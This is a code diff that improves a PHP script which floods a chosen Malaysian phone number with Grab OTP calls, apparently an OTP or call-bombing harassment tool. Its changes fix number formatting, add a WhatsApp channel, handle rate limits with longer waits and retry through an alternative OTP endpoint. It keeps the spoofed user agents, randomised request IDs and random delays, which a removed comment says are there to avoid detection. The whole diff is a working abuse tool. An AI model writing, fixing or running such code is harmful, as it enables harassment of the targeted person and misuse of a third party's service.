@@ -7,13 +7,11 @@ class GrabCaller {
         // Clean the number
         $number = preg_replace('/[^0-9]/', '', $number);
         
-        // Convert Malaysian format
+        // Convert Malaysian format - 011 numbers are 10-11 digits
         if (substr($number, 0, 2) == "60") {
             return $number;
         } elseif (substr($number, 0, 1) == "0") {
             return "60" . substr($number, 1);
-        } elseif (substr($number, 0, 3) == "601") {
-            return $number;
         } else {
             return "60" . $number;
         }
@@ -41,13 +39,15 @@ class GrabCaller {
         while ($a < $many) {
             $rand = rand(123456, 9999999);
             $rands = $this->randStr(12);
-            $post = "method=CALL&countryCode=my&phoneNumber=$no&templateID=pax_android_production";
+            
+            // Fix: Use correct country code and phone number format
+            $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=pax_android_production&channel=whatsapp";
+            
             $h = array();
             $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
             $h[] = "Accept-Language: ms-MY;q=1.0, en-us;q=0.9, en;q=0.8";
             $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
             $h[] = "Content-Type: application/x-www-form-urlencoded";
-            $h[] = "Content-Length: " . strlen($post);
             $h[] = "Host: api.grab.com";
             $h[] = "Connection: close";
             
@@ -60,28 +60,51 @@ class GrabCaller {
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
             curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_HEADER, false);
             
             $response = curl_exec($ch);
             $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
+            $error = curl_error($ch);
+            
+            // Remove curl_close for PHP 8.0+
+            if (version_compare(PHP_VERSION, '8.0.0', '<')) {
+                curl_close($ch);
+            }
             
             $a++;
             
+            // Check response
             if ($httpCode == 200 || $httpCode == 204) {
                 $success++;
                 echo "[$a/$many] ✅ Call sent successfully\n";
+            } elseif ($httpCode == 400) {
+                $failed++;
+                echo "[$a/$many] ❌ Failed - Invalid number format (HTTP: $httpCode)\n";
+                // Try alternate format
+                $this->tryAlternateFormat($no);
+                break;
+            } elseif ($httpCode == 429) {
+                $failed++;
+                echo "[$a/$many] ⚠️ Rate limited (HTTP: $httpCode) - Waiting longer...\n";
+                sleep(60);
             } else {
                 $failed++;
                 echo "[$a/$many] ❌ Failed (HTTP: $httpCode)\n";
+                if ($error) {
+                    echo "    Error: $error\n";
+                }
+                if ($response) {
+                    echo "    Response: $response\n";
+                }
             }
             
             if ($sleep !== null && $a < $many) {
                 sleep($sleep);
             }
             
-            // Random delay between 2-5 seconds to avoid detection
             if ($sleep === null && $a < $many) {
-                sleep(rand(2, 5));
+                sleep(rand(3, 7));
             }
         }
         
@@ -90,6 +113,35 @@ class GrabCaller {
         echo "[+] Successful: $success\n";
         echo "[+] Failed: $failed\n";
         echo "[+] ===============================\n";
+    }
+    
+    private function tryAlternateFormat($no) {
+        echo "[*] Trying alternative format...\n";
+        
+        // Try with different template ID
+        $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=grab_otp_production";
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        if ($httpCode == 200 || $httpCode == 204) {
+            echo "[+] ✅ Alternative format worked!\n";
+        } else {
+            echo "[-] ❌ Alternative format also failed\n";
+        }
+        
+        if (version_compare(PHP_VERSION, '8.0.0', '<')) {
+            curl_close($ch);
+        }
     }
     
     public function run() {
@@ -103,10 +155,9 @@ class GrabCaller {
             echo "Enter Malaysian number (e.g., 0123456789 or +60123456789): ";
             $input = trim(fgets(STDIN));
             
-            // Clean number
             $clean = preg_replace('/[^0-9]/', '', $input);
             
-            if (strlen($clean) >= 9 && strlen($clean) <= 11) {
+            if (strlen($clean) >= 9 && strlen($clean) <= 12) {
                 $this->number = $clean;
                 break;
             } else {
@@ -116,19 +167,25 @@ class GrabCaller {
         
         // Get number of calls
         while (true) {
-            echo "How many calls? (Max: 100): ";
+            echo "How many calls? (Max: 20): ";
             $many = trim(fgets(STDIN));
             
-            if (is_numeric($many) && $many > 0 && $many <= 100) {
+            if (is_numeric($many) && $many > 0 && $many <= 20) {
                 break;
             } else {
-                echo "❌ Please enter a number between 1-100\n";
+                echo "❌ Please enter a number between 1-20\n";
             }
         }
         
         // Optional delay
         echo "Add delay between calls? (0 = random delay, or seconds): ";
         $sleep = trim(fgets(STDIN));
+        
+        echo "\n[!] Note: This service may not work if Grab has changed their API\n";
+        echo "[!] 011 numbers sometimes don't work with Grab OTP\n";
+        echo "[!] Try with 012, 013, 014, 016, 017, 018, 019 numbers\n\n";
+        
+        sleep(2);
         
         if (is_numeric($sleep) && $sleep > 0) {
             $this->loop($many, $sleep);
@@ -138,17 +195,22 @@ class GrabCaller {
     }
 }
 
-// Clear screen for better display
+// Clear screen
 system('clear');
 
-// Check if curl is installed
+// Check PHP version
+echo "PHP Version: " . phpversion() . "\n";
+
+// Check curl
 if (!function_exists('curl_init')) {
     echo "❌ PHP CURL is not installed!\n";
     echo "Install it with: pkg install php-curl\n";
     exit;
 }
 
-// Run the script
+echo "✅ CURL is installed\n\n";
+
+// Run
 try {
     $caller = new GrabCaller();
     $caller->run();
